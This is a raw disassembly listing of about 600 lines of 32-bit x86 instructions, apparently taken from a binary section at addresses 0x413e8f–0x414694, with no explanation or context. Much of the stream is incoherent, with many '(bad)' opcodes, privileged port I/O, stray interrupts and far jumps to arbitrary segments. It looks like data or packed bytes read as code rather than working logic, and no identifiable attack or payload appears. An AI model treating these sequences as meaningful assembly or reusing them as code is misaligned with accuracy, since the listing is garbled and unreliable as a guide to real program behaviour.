  413e8f:	mov    ecx,0x6c59e4b
  413e94:	or     DWORD PTR ds:0xce830d92,ecx
  413e9a:	(bad)  
  413e9b:	leave  
  413e9c:	inc    ecx
  413e9d:	stc    
  413e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e9f:	xchg   ebp,eax
  413ea1:	dec    eax
  413ea2:	push   DWORD PTR [esi+0x226930bd]
  413ea8:	fmul   DWORD PTR [eax]
  413eaa:	ins    BYTE PTR es:[edi],dx
  413eab:	div    BYTE PTR [ebx]
  413ead:	hlt    
  413eae:	push   edi
  413eaf:	aad    0x51
  413eb1:	inc    esp
  413eb2:	adc    bl,al
  413eb4:	inc    edx
  413eb5:	pop    ecx
  413eb6:	iret   
  413eb7:	jl     0x413ef9
  413eb9:	cmp    ebp,esp
  413ebb:	cli    
  413ebc:	xchg   BYTE PTR [esi+ebx*2+0x8],bl
  413ec0:	mov    ebx,0xed8cd00f
  413ec5:	mov    edi,0x5a94bf18
  413eca:	(bad)  
  413ecb:	out    0xcc,al
  413ecd:	aas    
  413ece:	push   esp
  413ecf:	repz retf 
  413ed1:	sar    BYTE PTR [ecx+0x9],cl
  413ed4:	add    eax,0x75d4c35b
  413ed9:	sub    eax,DWORD PTR [ecx]
  413edb:	call   0x9e95695c
  413ee0:	sar    BYTE PTR ds:0x6c00fe4,cl
  413ee6:	push   ebx
  413ee7:	xor    DWORD PTR [esi+0x56],edx
  413eea:	or     DWORD PTR [ecx],esi
  413eec:	lds    eax,FWORD PTR [eax+0x2b]
  413eef:	dec    ebp
  413ef0:	jae    0x413f34
  413ef2:	sub    edx,DWORD PTR [edi-0x21b55c1c]
  413ef8:	push   cs
  413ef9:	jp     0x413f22
  413efb:	dec    ebp
  413efc:	repz dec ebp
  413efe:	push   ds
  413eff:	jae    0x413eb6
  413f01:	mov    ecx,0x8abdd5f7
  413f06:	push   ss
  413f07:	je     0x413f0f
  413f09:	fdivrp st(2),st
  413f0b:	fsubrp st(3),st
  413f0d:	daa    
  413f0e:	test   eax,0x6d5bc4e2
  413f13:	jb     0x413f1e
  413f15:	xor    BYTE PTR [bx+si+0x3f8e],dh
  413f1a:	sub    al,0x21
  413f1c:	(bad)  
  413f1e:	rcr    edi,1
  413f20:	in     eax,0xef
  413f22:	shl    BYTE PTR [ebx],cl
  413f24:	mov    edi,0xd857a64c
  413f29:	pop    ecx
  413f2a:	jnp    0x413f1d
  413f2c:	mov    bl,0xf7
  413f2e:	inc    edi
  413f2f:	in     al,dx
  413f30:	les    esi,FWORD PTR [ebp-0x2225bf34]
  413f36:	mov    eax,0x5ffb0351
  413f3b:	sbb    DWORD PTR [ebx-0x5495f056],esp
  413f41:	xchg   esi,eax
  413f42:	or     DWORD PTR [esi-0x2d],edx
  413f45:	imul   ebx,DWORD PTR [esi-0x11a49af1],0xffffff9b
  413f4c:	jo     0x413f83
  413f4e:	rol    BYTE PTR [ebp+0x34],1
  413f51:	clc    
  413f52:	outs   dx,DWORD PTR ds:[esi]
  413f53:	mov    ds:0x3632fd8c,al
  413f58:	cmp    DWORD PTR [eax-0x66],0x41
  413f5c:	(bad)  
  413f5d:	and    DWORD PTR [ebx-0x54b2058],ebp
  413f63:	jge    0x413f87
  413f65:	jbe    0x413fcd
  413f67:	loop   0x413f39
  413f69:	push   ss
  413f6a:	gs push ss
  413f6c:	and    eax,0x5c837254
  413f71:	les    eax,FWORD PTR [ecx]
  413f73:	int3   
  413f74:	in     al,dx
  413f75:	jb     0x413f23
  413f77:	or     eax,0xf3e5b787
  413f7c:	hlt    
  413f7d:	bound  edx,QWORD PTR [eax]
  413f7f:	pop    ds
  413f80:	nop
  413f81:	add    esp,DWORD PTR ds:0x3abdb547
  413f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f88:	add    DWORD PTR [ebx-0xc],edx
  413f8b:	ins    BYTE PTR es:[edi],dx
  413f8c:	rcr    dl,cl
  413f8e:	and    ecx,DWORD PTR ss:[esi+0x49]
  413f92:	rol    DWORD PTR [ebx+0x3443e2ab],1
  413f98:	ror    DWORD PTR ds:0x68077cb8,cl
  413f9e:	or     eax,0xcd1b6f13
  413fa3:	jo     0x413f34
  413fa5:	dec    DWORD PTR [ebx-0x61651429]
  413fab:	nop
  413fac:	inc    esi
  413fad:	xchg   edx,eax
  413fae:	int3   
  413faf:	test   al,0xd5
  413fb1:	mov    bl,0x16
  413fb3:	ja     0x413f65
  413fb5:	jmp    0xe718:0x295ad47c
  413fbc:	jl     0x413faa
  413fbe:	ret    0x4093
  413fc1:	mov    ecx,0x1f4c9637
  413fc6:	cmp    BYTE PTR [ebx-0xe],0x62
  413fca:	add    bl,BYTE PTR [edx+0x7a]
  413fcd:	add    al,0x7c
  413fcf:	inc    esp
  413fd0:	leave  
  413fd1:	jo     0x413fa3
  413fd3:	inc    ebx
  413fd4:	jge    0x414044
  413fd6:	mov    esi,0xb33aa317
  413fdb:	pop    ss
  413fdc:	aas    
  413fdd:	pushf  
  413fde:	add    esp,ebp
  413fe0:	sbb    DWORD PTR [esi+0x1a],eax
  413fe3:	fsub   DWORD PTR [ebx+0x7a5eaa75]
  413fe9:	lds    eax,FWORD PTR [ecx]
  413feb:	dec    ecx
  413fec:	aaa    
  413fed:	cmp    al,0xb
  413fef:	mov    dl,0xc9
  413ff1:	or     ecx,eax
  413ff3:	fst    DWORD PTR ds:0xa3a3572e
  413ff9:	dec    ecx
  413ffa:	fsubr  st(0),st
  413ffc:	aad    0x26
  413ffe:	sti    
  413fff:	push   edi
  414000:	fisttp WORD PTR [ebp+0x2d]
  414003:	stc    
  414004:	test   al,0xec
  414006:	dec    ebp
  414007:	or     bl,al
  414009:	int3   
  41400a:	pop    eax
  41400b:	inc    ecx
  41400c:	cld    
  41400d:	sbb    al,0xdb
  41400f:	dec    ecx
  414010:	mov    ss,WORD PTR [ebx]
  414012:	repnz enter 0xff85,0xcb
  414017:	xchg   ebx,eax
  414018:	mov    edx,0x715759f
  41401d:	mov    ecx,0x247b51ce
  414022:	in     al,0xf4
  414024:	pop    edi
  414025:	into   
  414026:	aaa    
  414027:	into   
  414028:	push   ecx
  414029:	aaa    
  41402a:	nop
  41402b:	sti    
  41402c:	(bad)
  414031:	stos   DWORD PTR es:[edi],eax
  414032:	cmc    
  414033:	mov    es,WORD PTR ss:[ebx+0x62]
  414037:	cmp    DWORD PTR [ecx-0x49dcac6],ecx
  41403d:	imul   ecx,DWORD PTR [edx+0x4299b991],0xbd395bd7
  414047:	jecxz  0x413feb
  414049:	leave  
  41404a:	ja     0x41407a
  41404c:	inc    eax
  41404d:	shl    BYTE PTR [ebx+0x42],cl
  414050:	cmp    al,0xd3
  414052:	ins    DWORD PTR es:[edi],dx
  414053:	mov    esp,0xc092a993
  414058:	inc    edi
  414059:	in     eax,0x15
  41405b:	retf   0x80f2
  41405e:	add    BYTE PTR [esi],cl
  414060:	inc    eax
  414061:	out    0xdf,eax
  414063:	shl    BYTE PTR [eax+0x2c82d17f],cl
  414069:	push   es
  41406a:	add    BYTE PTR [edx],dl
  41406c:	sar    DWORD PTR [esp+edi*4+0x17],0x2e
  414071:	push   ds
  414072:	or     BYTE PTR [ecx],bh
  414074:	mov    BYTE PTR ss:[ebx+0x597f9b09],al
  41407b:	mov    ah,0x95
  41407d:	and    ecx,ebx
  41407f:	fsub   DWORD PTR [edi-0x79]
  414082:	jp     0x414096
  414084:	xor    ebp,DWORD PTR [ebx+edx*1-0x9]
  414088:	add    cl,0xfa
  41408b:	int3   
  41408c:	fcom   QWORD PTR [ecx+esi*2-0xdc712ef]
  414093:	popa   
  414094:	int3   
  414095:	sbb    DWORD PTR [edi+0x58ac2e5f],0x518392ea
  41409f:	into   
  4140a0:	in     al,0xed
  4140a2:	bound  eax,QWORD PTR [ecx-0x7d37f8a9]
  4140a8:	pop    edx
  4140a9:	push   es
  4140aa:	dec    ebx
  4140ab:	adc    ch,BYTE PTR [ebx+0x5b]
  4140ae:	or     BYTE PTR [edx],0xca
  4140b1:	fcmovu st,st(0)
  4140b3:	push   0x1d003d11
  4140b8:	push   ebp
  4140b9:	inc    esi
  4140ba:	popf   
  4140bb:	push   ss
  4140bc:	jae    0x4140e3
  4140be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140bf:	push   esp
  4140c0:	and    al,0x31
  4140c2:	xor    ebx,DWORD PTR [ebx]
  4140c4:	cs test bl,0x6b
  4140c8:	shl    BYTE PTR [edx],cl
  4140ca:	jl     0x4140aa
  4140cc:	imul   ebp,DWORD PTR [esi-0x44],0xffffff93
  4140d0:	inc    esp
  4140d1:	add    ebx,0xfffffffd
  4140d4:	test   eax,0x7dc942fc
  4140d9:	xor    al,BYTE PTR [ebp-0x7a757d3e]
  4140df:	pop    es
  4140e0:	pop    edx
  4140e1:	push   esi
  4140e2:	push   ebp
  4140e3:	call   FWORD PTR [esi]
  4140e5:	jne    0x41414c
  4140e7:	js     0x4140fe
  4140e9:	xchg   ebp,eax
  4140ea:	les    edi,FWORD PTR [edi-0x74]
  4140ed:	inc    esi
  4140ee:	xor    dh,BYTE PTR [esi]
  4140f0:	icebp  
  4140f1:	mov    ah,0x89
  4140f3:	adc    al,0x90
  4140f5:	push   esi
  4140f6:	jge    0x41409c
  4140f8:	jne    0x4140eb
  4140fa:	add    eax,0xd5881dc7
  4140ff:	jo     0x4140b6
  414101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414102:	call   0x63a3:0xddb99e54
  414109:	or     al,0xaf
  41410b:	je     0x41414e
  41410d:	jmp    0x130f:0x9de6dbd5
  414114:	sub    edi,DWORD PTR [ecx]
  414116:	enter  0xe642,0x30
  41411a:	popf   
  41411b:	pop    ebp
  41411c:	ror    DWORD PTR [edi-0x5a5fe0b5],cl
  414122:	cmp    edi,esi
  414124:	adc    BYTE PTR [edx-0x4fcc6823],bh
  41412a:	jl     0x414145
  41412c:	xchg   DWORD PTR [ecx-0x8],ecx
  41412f:	fwait
  414130:	arpl   si,ax
  414132:	mov    bh,0xaa
  414134:	lds    eax,FWORD PTR ds:0x94694283
  41413a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41413b:	in     al,0x1c
  41413d:	or     DWORD PTR [ecx-0x4f],ebx
  414140:	in     al,0x9b
  414142:	jmp    FWORD PTR [ecx-0xb1fbd30]
  414148:	clc    
  414149:	fsubr  DWORD PTR [edi+0x276536fa]
  41414f:	imul   ecx,DWORD PTR [ecx-0x1a],0x3d
  414153:	and    DWORD PTR [ebx],ebp
  414155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414156:	or     BYTE PTR [ecx-0x174e9185],0x6c
  41415d:	js     0x41417d
  41415f:	shl    DWORD PTR [ebp-0x80],0xea
  414163:	mov    ebp,0x61b5ee9
  414168:	mov    ebx,0x24e61826
  41416d:	jmp    0xfbc5d44b
  414172:	or     ecx,edi
  414174:	sbb    eax,0xdbe76918
  414179:	ret    
  41417a:	ss leave 
  41417c:	das    
  41417d:	popf   
  41417e:	std    
  41417f:	sbb    DWORD PTR [esi],0x2f5f4669
  414185:	xchg   ebp,eax
  414186:	adc    edx,DWORD PTR gs:[ebx]
  414189:	xor    BYTE PTR [esi],cl
  41418b:	pusha  
  41418c:	push   edx
  41418d:	add    DWORD PTR [ebp+0x1ff5b798],esi
  414193:	or     dh,BYTE PTR [eax-0x2c]
  414196:	adc    al,0xd4
  414198:	(bad)  
  414199:	xor    eax,0xc534edf0
  41419e:	add    eax,0x4d48012b
  4141a3:	inc    esi
  4141a4:	push   eax
  4141a5:	sbb    al,0x3f
  4141a7:	jnp    0x414134
  4141a9:	mov    ebp,0xf6a36c7b
  4141ae:	outs   dx,BYTE PTR ds:[esi]
  4141af:	mov    dh,0x84
  4141b1:	push   cs
  4141b2:	adc    BYTE PTR [ebp+edi*1+0x62],bh
  4141b6:	fwait
  4141b7:	push   ecx
  4141b8:	aam    0x7d
  4141ba:	sbb    DWORD PTR [esi],edx
  4141bc:	hlt    
  4141bd:	xchg   ecx,eax
  4141be:	sub    al,0x30
  4141c0:	jb     0x41422e
  4141c2:	pop    ebx
  4141c3:	aas    
  4141c4:	scas   eax,DWORD PTR es:[edi]
  4141c5:	dec    ebx
  4141c6:	cmp    eax,0x690bb93e
  4141cb:	lea    edi,[ebp+esi*1+0x7f]
  4141cf:	sbb    BYTE PTR [ecx+0xf4c1074],dh
  4141d5:	pusha  
  4141d6:	add    eax,0xe1d61277
  4141db:	test   cl,ah
  4141dd:	fimul  DWORD PTR [ebx+0x3991e238]
  4141e3:	mov    eax,0x528347f4
  4141e8:	in     al,0xf1
  4141ea:	daa    
  4141eb:	push   ebx
  4141ec:	(bad)  
  4141ed:	mov    ecx,0xb427eba9
  4141f2:	inc    ebx
  4141f3:	mov    dl,0x8d
  4141f5:	hlt    
  4141f6:	pushf  
  4141f7:	aad    0xf9
  4141f9:	(bad)  
  4141fa:	jmp    0x41424e
  4141fc:	call   0xbc97:0x3db89680
  414203:	adc    ecx,DWORD PTR [eax]
  414205:	aaa    
  414206:	fs or  eax,0x135686d3
  41420c:	les    ebx,FWORD PTR [edx+0x35]
  41420f:	psllw  mm7,QWORD PTR [esi]
  414212:	cmp    al,BYTE PTR [edx+0x19]
  414215:	lahf   
  414216:	add    BYTE PTR [eax],0xf3
  414219:	jl     0x4141bb
  41421b:	test   DWORD PTR [ecx+0x6049bc68],ebx
  414221:	xor    eax,0x2e2332ca
  414226:	xchg   eax,ecx
  414228:	mov    DWORD PTR [esi],ecx
  41422a:	test   BYTE PTR ds:0x8f5f0d5a,bh
  414230:	pop    ss
  414231:	and    ch,dl
  414233:	cs xchg esi,eax
  414235:	mov    al,0x3
  414237:	mov    ebx,0xbdc1a5eb
  41423c:	adc    ebx,DWORD PTR gs:[ebx+0x278af3b4]
  414243:	call   0x6cff:0xf997f7a3
  41424a:	(bad)  
  41424b:	(bad)  
  41424c:	out    0xc6,al
  41424e:	stc    
  41424f:	into   
  414250:	(bad)  
  414251:	(bad)  
  414252:	repz jmp 0x414212
  414255:	shld   ecx,ecx,0xf1
  414259:	cli    
  41425a:	test   DWORD PTR [edx+esi*8],ebx
  41425d:	inc    edx
  41425e:	call   0x7416c77
  414263:	add    al,0x19
  414265:	xchg   edx,eax
  414266:	sbb    DWORD PTR [edx],ebp
  414268:	xchg   edx,eax
  414269:	jnp    0x4142b4
  41426b:	repnz dec dx
  41426e:	sbb    edi,0xb51e32a9
  414274:	push   cs
  414275:	dec    ecx
  414277:	xlat   BYTE PTR ds:[ebx]
  414278:	jmp    0xc3cd:0x5456439d
  41427f:	mov    es,WORD PTR [esi-0x3df310c6]
  414285:	adc    al,BYTE PTR [eax]
  414287:	ins    DWORD PTR es:[edi],dx
  414288:	and    eax,0x95ba84e7
  41428d:	sbb    al,BYTE PTR es:[eax+0x3fcd2163]
  414294:	in     al,0x87
  414296:	daa    
  414297:	jno    0x414253
  414299:	add    ebp,ebx
  41429b:	cmp    al,0xb3
  41429d:	push   0xffffff9b
  41429f:	in     al,dx
  4142a0:	icebp  
  4142a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a2:	adc    DWORD PTR gs:[ebx+0x6c],ebp
  4142a6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4142a8:	aaa    
  4142a9:	jne    0x41428c
  4142ab:	hlt    
  4142ac:	pop    es
  4142ad:	shl    dl,0x2f
  4142b0:	fidiv  WORD PTR [eax+0x0]
  4142b3:	xchg   DWORD PTR [ecx+0x1af97f56],ecx
  4142b9:	cmc    
  4142ba:	arpl   WORD PTR [edx-0x26],bp
  4142bd:	repnz mov bh,0x55
  4142c0:	inc    ebx
  4142c1:	jae    0x414328
  4142c3:	mov    ch,0xa9
  4142c5:	adc    WORD PTR [esi-0x35],bp
  4142c9:	dec    BYTE PTR [edi]
  4142cb:	cdq    
  4142cc:	stos   DWORD PTR es:[edi],eax
  4142cd:	retf   
  4142ce:	fcomp  DWORD PTR [edi]
  4142d0:	xchg   ebx,eax
  4142d1:	inc    edx
  4142d2:	dec    ebx
  4142d3:	jp     0x414255
  4142d5:	rcl    DWORD PTR [edi],1
  4142d7:	push   cs
  4142d8:	jb     0x4142b7
  4142da:	sub    al,0x4f
  4142dc:	fnstcw WORD PTR [ebx-0x3f]
  4142df:	aaa    
  4142e0:	sbb    DWORD PTR [eax-0x1],edx
  4142e3:	mov    DWORD PTR [edx-0x35cfdd59],esi
  4142e9:	mov    edx,0xab8a16fe
  4142ee:	clc    
  4142ef:	lds    esp,FWORD PTR [esi-0x3c0245e9]
  4142f5:	inc    esi
  4142f6:	std    
  4142f7:	dec    edx
  4142f8:	mov    edi,0x7ad76bbe
  4142fd:	jo     0x414351
  4142ff:	sub    edx,DWORD PTR ds:0xeb3e377e
  414305:	shr    DWORD PTR [ebp+0x2c],0x22
  414309:	stos   DWORD PTR es:[edi],eax
  41430a:	mov    ecx,0xdbc07977
  41430f:	loopne 0x4142d0
  414311:	pop    ebp
  414312:	shl    edi,0x1a
  414315:	sahf   
  414316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414317:	sar    DWORD PTR [edx+0x38],1
  41431a:	fnstsw WORD PTR [ecx+eax*8]
  41431d:	loope  0x41437f
  41431f:	sub    ebx,edi
  414321:	nop
  414322:	mov    esp,0xafafd68c
  414327:	cmp    BYTE PTR [edx],ch
  414329:	xchg   ebx,eax
  41432a:	inc    eax
  41432b:	icebp  
  41432c:	cdq    
  41432d:	push   ebp
  41432e:	es daa 
  414330:	lahf   
  414331:	jge    0x4143a7
  414333:	cdq    
  414334:	dec    ecx
  414335:	dec    esi
  414336:	push   ecx
  414337:	cld    
  414338:	push   ecx
  414339:	in     al,0x14
  41433b:	inc    DWORD PTR [edi-0x682feb46]
  414341:	pop    ebp
  414342:	pop    esi
  414343:	xlat   BYTE PTR ds:[ebx]
  414344:	cmp    al,0x10
  414346:	call   0xd8389d3e
  41434b:	xchg   esp,eax
  41434c:	or     edx,0x28
  41434f:	shr    BYTE PTR [edi],0xc6
  414352:	dec    esp
  414353:	and    al,0xe8
  414355:	xor    esp,DWORD PTR [ebx-0x7d]
  414358:	les    edi,FWORD PTR cs:[eax]
  41435b:	arpl   WORD PTR [edx-0x42],si
  41435e:	iret   
  41435f:	cmp    al,0x72
  414361:	xor    eax,0xb36a2f17
  414366:	adc    cl,BYTE PTR [edx+edi*8+0x50d9a1e0]
  41436d:	jo     0x414391
  41436f:	cmp    ebx,0x8
  414372:	retf   
  414373:	jmp    0x3686:0xecfca0fa
  41437a:	xchg   esp,eax
  41437b:	in     eax,dx
  41437c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41437d:	outs   dx,DWORD PTR ds:[esi]
  41437e:	sbb    bh,BYTE PTR [eax]
  414380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414381:	mov    ds:0xe0946fc1,al
  414386:	xor    cl,BYTE PTR [edx+0x12]
  414389:	inc    bl
  41438b:	cs mov ch,0xe4
  41438e:	jns    0x41436d
  414390:	jb     0x414326
  414392:	mov    al,ds:0x6cfcb02e
  414397:	push   cs
  414398:	ins    DWORD PTR es:[edi],dx
  414399:	xor    bh,BYTE PTR [edi]
  41439b:	jbe    0x414405
  41439d:	fisub  WORD PTR [ecx+0x17]
  4143a0:	aad    0xd7
  4143a2:	push   ecx
  4143a3:	pusha  
  4143a4:	jg     0x414415
  4143a6:	xchg   BYTE PTR [ebp-0x4d9de58b],ah
  4143ac:	sahf   
  4143ad:	rcr    DWORD PTR [edi+0x36c120f9],1
  4143b3:	inc    ebx
  4143b4:	or     BYTE PTR [edx],al
  4143b6:	or     DWORD PTR es:[eax-0x62e03cd5],0xffffff80
  4143be:	js     0x4143a7
  4143c0:	dec    esi
  4143c1:	cs popa 
  4143c3:	mov    edi,0x966b2717
  4143c8:	sub    eax,0x104127db
  4143cd:	sar    BYTE PTR [edi+0x35cdbd41],1
  4143d3:	out    dx,al
  4143d4:	stc    
  4143d5:	dec    ebp
  4143d6:	and    BYTE PTR [edi],ah
  4143d8:	jmp    FWORD PTR [ecx]
  4143da:	push   ecx
  4143db:	push   ebp
  4143dc:	sbb    DWORD PTR [edi+0x24],0x24230eaa
  4143e3:	arpl   WORD PTR [edx-0x5d21b73],si
  4143e9:	lea    esp,[eax+0x1c28091b]
  4143ef:	xchg   edx,eax
  4143f0:	cmp    bl,BYTE PTR [ebp+0x19]
  4143f3:	pop    ebx
  4143f4:	test   al,0x6a
  4143f6:	add    DWORD PTR [esi],edx
  4143f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143f9:	mov    DWORD PTR [ebx],ecx
  4143fb:	mov    ebp,DWORD PTR [edx+0x4b533758]
  414401:	ret    
  414402:	fnsave [esi-0x4d4ce6ea]
  414408:	jne    0x4143d5
  41440a:	les    esi,FWORD PTR [esi+edx*8]
  41440d:	call   FWORD PTR [ebx-0xa78fbae]
  414413:	das    
  414414:	push   esp
  414415:	mov    edx,0x35d536a0
  41441a:	inc    edx
  41441b:	mov    esi,0xe6c526e6
  414420:	jo     0x414461
  414422:	push   eax
  414423:	xor    DWORD PTR [eax],edx
  414425:	sub    esi,DWORD PTR ds:0x1999ef8e
  41442b:	mov    eax,0x9ac74c28
  414430:	mov    ecx,0xcf1c34c4
  414435:	xchg   ebp,eax
  414436:	or     ah,BYTE PTR [edi-0xac72588]
  41443c:	stos   BYTE PTR es:[edi],al
  41443d:	mov    ds:0x88ee6237,eax
  414442:	and    eax,0xc5318105
  414447:	mov    dh,0x6c
  414449:	jmp    0x6e4b:0xb3d546fc
  414450:	(bad)  
  414451:	cmp    BYTE PTR [esi+0x5a323d0d],cl
  414457:	jbe    0x4144aa
  414459:	outs   dx,BYTE PTR ds:[esi]
  41445a:	mov    ss,WORD PTR [eax-0x1f84e5ab]
  414460:	test   BYTE PTR [ecx+0xe7b3ff7],ah
  414466:	sbb    DWORD PTR [edi],ecx
  414468:	call   0x46827b2e
  41446d:	pop    ebp
  41446e:	sbb    al,0x13
  414470:	add    al,0xda
  414472:	adc    DWORD PTR [edx+edi*1+0x5d],ecx
  414476:	jae    0x414490
  414478:	inc    ebp
  414479:	call   0xde1:0xb8c9d94f
  414480:	sbb    dh,cl
  414482:	jle    0x41449d
  414484:	fisttp DWORD PTR [ebx+0x7e]
  414487:	sub    BYTE PTR [ebp+0x4b],dh
  41448a:	mov    eax,0x8b4a538
  41448f:	push   es
  414490:	fcom   DWORD PTR [edx+edi*2+0x4f776ef3]
  414497:	inc    esp
  414498:	daa    
  414499:	mov    bh,0xb4
  41449b:	cmp    eax,DWORD PTR [esi-0x19fd52b9]
  4144a1:	test   al,0xb7
  4144a3:	cmp    al,0x57
  4144a5:	inc    eax
  4144a6:	int    0xd2
  4144a8:	icebp  
  4144a9:	iret   
  4144aa:	mov    ebx,0xd035fc49
  4144af:	sbb    al,0x75
  4144b1:	mov    DWORD PTR [ebx+0x425f99b3],0xd533e009
  4144bb:	mov    eax,0xbf67b26d
  4144c0:	mov    bx,WORD PTR [ecx+ecx*1-0x41fe6529]
  4144c8:	xor    ecx,0xffffff84
  4144cb:	mov    esi,0x30b3b479
  4144d0:	sbb    edx,eax
  4144d2:	cld    
  4144d3:	pop    ds
  4144d4:	cwde   
  4144d5:	imul   ecx,edx,0x47866660
  4144db:	jle    0x4144b4
  4144dd:	cmp    cl,BYTE PTR [eax]
  4144df:	cdq    
  4144e0:	xchg   ebx,eax
  4144e1:	xchg   ebx,eax
  4144e2:	xor    ecx,ecx
  4144e4:	out    dx,al
  4144e5:	loope  0x414512
  4144e7:	in     al,dx
  4144e8:	jae    0x4144fd
  4144ea:	shl    ecx,0x92
  4144ed:	pusha  
  4144ee:	(bad)  [edi-0x53]
  4144f1:	jb     0x414546
  4144f3:	sub    esp,DWORD PTR [ecx-0x78a02348]
  4144f9:	cmp    al,0x76
  4144fb:	shl    cl,0x0
  4144fe:	inc    eax
  4144ff:	ja     0x41456f
  414501:	jmp    0x5c90fc7c
  414506:	push   ebp
  414507:	and    eax,DWORD PTR [ebp+0x52825401]
  41450d:	xchg   esi,eax
  41450e:	out    0x2e,al
  414510:	jg     0x414520
  414512:	mov    DWORD PTR [edi],edx
  414514:	test   eax,0x648ac2d1
  414519:	push   ss
  41451a:	push   edx
  41451b:	cld    
  41451c:	pushf  
  41451d:	ins    BYTE PTR es:[edi],dx
  41451e:	push   esp
  41451f:	sahf   
  414520:	pcmpgtb mm7,mm3
  414523:	outs   dx,DWORD PTR ds:[esi]
  414524:	int    0xa
  414526:	outs   dx,DWORD PTR ds:[esi]
  414527:	mov    edi,0x38492b0f
  41452c:	lods   al,BYTE PTR ds:[esi]
  41452d:	push   ds
  41452e:	cmp    DWORD PTR [eax-0xf],edi
  414531:	jo     0x4145ae
  414533:	mov    eax,0x44d7a3e4
  414538:	bound  ebx,QWORD PTR ds:0xafe95590
  41453e:	push   0x53329c9e
  414543:	pop    ebp
  414544:	jl     0x4144d5
  414546:	repnz int3 
  414548:	ror    DWORD PTR [eax],1
  41454a:	std    
  41454b:	rcl    ch,1
  41454d:	xchg   DWORD PTR [eax-0x471018ed],edi
  414553:	xor    DWORD PTR [ebp-0x3265154f],eax
  414559:	jecxz  0x4144f1
  41455b:	retf   0xb8f5
  41455e:	mul    BYTE PTR [esi-0x1]
  414561:	je     0x41456e
  414563:	jnp    0x414579
  414565:	dec    ebx
  414566:	pop    eax
  414567:	pop    ecx
  414568:	add    DWORD PTR [edx+0x67],edx
  41456b:	lock mov ds:0xa5131e79,eax
  414571:	shr    DWORD PTR [edx],1
  414573:	in     al,0xc
  414575:	pop    ebp
  414576:	je     0x41453b
  414578:	in     eax,dx
  414579:	xchg   esp,eax
  41457a:	cld    
  41457b:	test   cl,dh
  41457d:	mov    esi,0x95798d3c
  414582:	dec    ecx
  414583:	jae    0x41455a
  414585:	or     al,0x20
  414587:	add    eax,0x6d68da7b
  41458c:	daa    
  41458d:	aad    0xb7
  41458f:	xchg   DWORD PTR [eax-0x635fcee1],edi
  414595:	fdiv   QWORD PTR [ebx-0x6bce16a2]
  41459b:	pop    esi
  41459c:	jp     0x4145d9
  41459e:	push   ss
  41459f:	test   BYTE PTR [esi-0x6],al
  4145a2:	cmp    edi,DWORD PTR [ecx+ebp*8+0x20]
  4145a6:	sbb    al,BYTE PTR [ebx+0x4f29640e]
  4145ac:	xchg   esp,eax
  4145ad:	hlt    
  4145ae:	lock pop edx
  4145b0:	mov    al,ds:0x9562bcea
  4145b5:	xchg   edx,eax
  4145b6:	std    
  4145b7:	leave  
  4145b8:	js     0x414630
  4145ba:	pop    ds
  4145bb:	call   0x19f9:0x4149a150
  4145c2:	jmp    0x414570
  4145c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145c5:	std    
  4145c6:	(bad)  
  4145c7:	cli    
  4145c8:	xchg   ebp,eax
  4145c9:	xchg   edi,eax
  4145ca:	(bad)  
  4145cb:	es xchg edi,eax
  4145cd:	(bad)  
  4145ce:	and    al,BYTE PTR [edx+ecx*4+0x5a]
  4145d2:	fcmovnbe st,st(1)
  4145d4:	cmp    al,0xa7
  4145d6:	repnz sahf 
  4145d8:	or     ah,0x13
  4145db:	sti    
  4145dc:	icebp  
  4145dd:	call   0xb0a7:0x6bceeaf5
  4145e4:	and    cl,BYTE PTR [ebx+0x5991624b]
  4145ea:	xor    dh,BYTE PTR [esi+0x4953e5b4]
  4145f0:	mov    WORD PTR [edx-0x790c5ec],ss
  4145f6:	mov    ecx,0xa74e8c2c
  4145fb:	dec    ebp
  4145fc:	das    
  4145fd:	jmp    0x814:0x331a7e15
  414604:	loope  0x4145a5
  414606:	cvtps2pd xmm1,QWORD PTR [edx+0x8]
  41460a:	mov    dl,0x72
  41460c:	ins    BYTE PTR es:[edi],dx
  41460d:	call   0xa2b70b6a
  414612:	iret   
  414613:	jo     0x4145a5
  414615:	lahf   
  414616:	dec    esp
  414617:	xor    eax,DWORD PTR [edi+0x2891b2cc]
  41461d:	popa   
  41461e:	mov    ds,WORD PTR [ebx-0x41]
  414621:	inc    edx
  414622:	push   eax
  414623:	add    cl,bh
  414625:	jno    0x4145c1
  414627:	bound  eax,QWORD PTR [esi]
  414629:	scas   eax,DWORD PTR es:[edi]
  41462a:	mov    DWORD PTR [ebx+0x69e626c0],edi
  414630:	push   0x1b
  414632:	sbb    eax,DWORD PTR [ecx+0x36]
  414635:	enter  0x8fff,0xa2
  414639:	call   0xc3a3b814
  41463e:	int    0xcd
  414640:	and    ch,BYTE PTR [bp+si-0x25]
  414644:	or     ecx,DWORD PTR [eax]
  414646:	sbb    al,0x65
  414648:	fistp  QWORD PTR [ecx+0x23]
  41464b:	inc    DWORD PTR [eax+0x5f448bdb]
  414651:	aad    0x29
  414653:	push   esp
  414654:	aas    
  414655:	mov    esi,0x656c9ca2
  41465a:	mov    esp,0x2400d3c8
  41465f:	mov    ss,WORD PTR [eax+edi*8]
  414662:	test   eax,0x77399dc0
  414667:	out    0x69,al
  414669:	sub    edi,edi
  41466b:	xor    al,0xc7
  41466d:	dec    ecx
  41466e:	dec    BYTE PTR [ebp+0x62231fe8]
  414674:	push   ds
  414675:	sbb    DWORD PTR [ebx],eax
  414677:	inc    eax
  414678:	loope  0x414699
  41467a:	clc    
  41467b:	fcomp  QWORD PTR [ecx+0x66]
  41467e:	jno    0x41464f
  414680:	sbb    dh,BYTE PTR [ebp-0x28]
  414683:	popf   
  414684:	mov    al,0xd5
  414686:	jne    0xcea9dc6d
  41468c:	pusha  
  41468d:	retf   
  41468e:	lods   ax,WORD PTR ds:[esi]
  414690:	test   DWORD PTR [edi+0x21],ecx
  414693:	inc    ebp
  414694:	ret    
